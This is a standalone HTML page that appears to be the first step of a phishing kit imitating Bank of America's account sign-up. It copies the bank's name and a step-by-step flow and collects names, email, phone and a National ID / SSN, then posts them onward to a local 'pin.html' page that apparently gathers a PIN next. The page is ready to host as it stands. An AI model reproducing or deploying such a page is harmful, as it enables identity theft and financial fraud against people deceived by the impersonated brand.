<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Create Account - Bank of America</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f7f7f7;
      margin: 0;
      padding: 20px;
    }

    .container {
      max-width: 500px;
      margin: auto;
      background: #fff;
      padding: 25px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    h1 {
      font-size: 22px;
      margin-bottom: 15px;
    }

    p {
      font-size: 15px;
      margin-bottom: 20px;
    }

    .steps {
      margin: 15px 0;
      font-size: 16px;
    }

    label {
      display: block;
      margin: 12px 0 6px;
      font-weight: bold;
    }

    input, select, button {
      width: 100%;
      padding: 12px;
      font-size: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
    }

    button {
      margin-top: 20px;
      background: #0070c9;
      color: #fff;
      border: none;
      cursor: pointer;
      font-size: 16px;
    }

    button:hover {
      background: #005fa3;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Bank of America - Create Account</h1>
    <p>
      Welcome to Bank of America online registration.  
      Please fill out the form below carefully to open your secure digital account.
    </p>

    <div class="steps">
      <b style="color:green;">Step 1</b> → Step 2 → Step 3 → Step 4
    </div>

    <form action="pin.html" method="POST">
      <label for="fname">First Name</label>
      <input type="text" id="fname" name="fname" placeholder="e.g., John" required>

      <label for="lname">Last Name</label>
      <input type="text" id="lname" name="lname" placeholder="e.g., Smith" required>

      <label for="email">Email</label>
      <input type="email" id="email" name="email" placeholder="e.g., john.smith@email.com" required>

      <label for="phone">Phone</label>
      <input type="tel" id="phone" name="phone" placeholder="e.g., +1 555 123 4567" required>

      <label for="gender">Gender</label>
      <select id="gender" name="gender" required>
        <option value="">-- Select --</option>
        <option value="male">Male</option>
        <option value="female">Female</option>
        <option value="other">Other</option>
      </select>

      <label for="id">National ID / SSN</label>
      <input type="text" id="id" name="id" placeholder="e.g., 123-45-6789" required>

      <button type="submit">Next</button>
    </form>
  </div>
</body>
</html>
